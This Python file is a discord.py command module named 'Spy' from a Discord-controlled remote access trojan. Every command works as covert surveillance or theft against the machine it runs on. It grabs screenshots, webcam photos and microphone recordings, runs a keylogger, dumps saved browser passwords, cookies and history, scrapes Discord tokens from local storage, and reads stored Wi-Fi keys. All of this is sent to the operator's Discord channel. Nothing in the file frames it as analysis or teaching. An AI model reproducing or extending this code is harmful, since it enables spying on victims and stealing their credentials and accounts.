import asyncio
import io
import os
import pathlib
import re

import discord
from discord.ext import commands

from core import browser, capture, creds, keylog, notify, web
from core.util import code, run_ps, say


class Spy(commands.Cog):
    """Screen, camera, mic, keylog, browser data."""

    def __init__(self, bot):
        self.bot = bot

    # ------------------------------------------------------------ screen
    @commands.command(aliases=['ss'])
    async def screen(self, ctx, mon: int = 1):
        b = await asyncio.to_thread(capture.STREAM.snap_bytes, mon)
        await ctx.channel.send(file=discord.File(io.BytesIO(b), 'screen.png'))

    @commands.command()
    async def screens(self, ctx):
        await code(ctx.channel, '\n'.join(
            f'{m["i"]}: {m["w"]}x{m["h"]}' for m in await asyncio.to_thread(capture.monitors)))

    @commands.command()
    async def stream(self, ctx, action: str = 'start'):
        """start | stop | url — live screen over the panel"""
        if action == 'stop':
            await web.stop()
            await notify.down('stopped')
            return await say(ctx.channel, 'stream stopped')

        if action == 'url':
            u = web.URL or web.lan_url()
            return await say(ctx.channel, f'{u}/?k={self.bot.cfg["web_token"]}'
                             if u else 'not running')

        url = await notify.ensure_panel(self.bot, self.bot.cfg, 'stream')
        await say(ctx.channel, f'**LIVE** {url}' if url else 'tunnel failed')

    # ------------------------------------------------------------ camera / mic
    @commands.command()
    async def cam(self, ctx, idx: int = 0):
        try:
            import cv2
            cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            ok, fr = cap.read()
            cap.release()
            if not ok:
                raise RuntimeError('no camera')
            ok, jpg = cv2.imencode('.jpg', fr, [cv2.IMWRITE_JPEG_QUALITY, 78])
            await ctx.channel.send(file=discord.File(io.BytesIO(jpg.tobytes()), 'cam.jpg'))
        except Exception as e:
            await say(ctx.channel, f'failed: {e}')

    @commands.command()
    async def cams(self, ctx):
        try:
            import cv2
            found = []
            for i in range(5):
                cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
                if cap.isOpened():
                    ok, _ = cap.read()
                    if ok:
                        found.append(i)
                cap.release()
            await say(ctx.channel, f'cameras: {found or "none"}')
        except Exception as e:
            await say(ctx.channel, f'failed: {e}')

    @commands.command()
    async def mic(self, ctx, secs: int = 8):
        try:
            import sounddevice as sd
            import soundfile as sf
            rec = await asyncio.to_thread(sd.rec, int(secs * 16000), samplerate=16000, channels=1)
            buf = io.BytesIO()
            sf.write(buf, rec, 16000, format='WAV')
            buf.seek(0)
            await ctx.channel.send(file=discord.File(buf, 'mic.wav'))
        except Exception as e:
            await say(ctx.channel, f'failed: {e}')

    # ------------------------------------------------------------ keylog
    @commands.command()
    async def keys(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(keylog.read))

    @commands.command()
    async def keys_start(self, ctx):
        await say(ctx.channel, 'on' if await asyncio.to_thread(keylog.start) else 'already on')

    @commands.command()
    async def keys_stop(self, ctx):
        keylog.stop()
        await say(ctx.channel, 'off')

    @commands.command()
    async def keys_clear(self, ctx):
        keylog.clear()
        await say(ctx.channel, 'cleared')

    # ------------------------------------------------------------ desktop
    @commands.command()
    async def active(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Add-Type -MemberDefinition \'[DllImport("user32.dll")]public static extern IntPtr '
            'GetForegroundWindow();[DllImport("user32.dll")]public static extern int GetWindowText('
            'IntPtr h,System.Text.StringBuilder s,int c);\' -Name W -Namespace U;'
            '$s=New-Object Text.StringBuilder 512;'
            '[U.W]::GetWindowText([U.W]::GetForegroundWindow(),$s,512);$s.ToString()'))

    @commands.command()
    async def windows(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-Process|? MainWindowTitle|Select Id,MainWindowTitle'
            '|ft -AutoSize|Out-String -Width 200'))

    # ------------------------------------------------------------ browser
    @commands.command()
    async def passwords(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(browser.passwords))

    @commands.command()
    async def cookies(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(browser.cookies))

    @commands.command()
    async def history(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(browser.history))

    @commands.command()
    async def dtoken(self, ctx):
        out = []
        for lvl in ('Local Storage', 'leveldb'):
            d = pathlib.Path(os.getenv('APPDATA', '.')) / 'discord' / lvl
            if not d.exists():
                continue
            for f in list(d.glob('*.ldb')) + list(d.glob('*.log')):
                try:
                    for m in re.finditer(rb'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)', f.read_bytes()):
                        out.append(m.group(1).decode())
                except Exception:
                    pass
        await code(ctx.channel, '\n'.join(dict.fromkeys(out))[:4000] or 'none')

    @commands.command()
    async def wifikeys(self, ctx):
        for w in await asyncio.to_thread(creds.wifi):
            await say(ctx.channel, f'`{w["ssid"]}` : `{w["key"] or "(open)"}`')


async def setup(bot):
    await bot.add_cog(Spy(bot))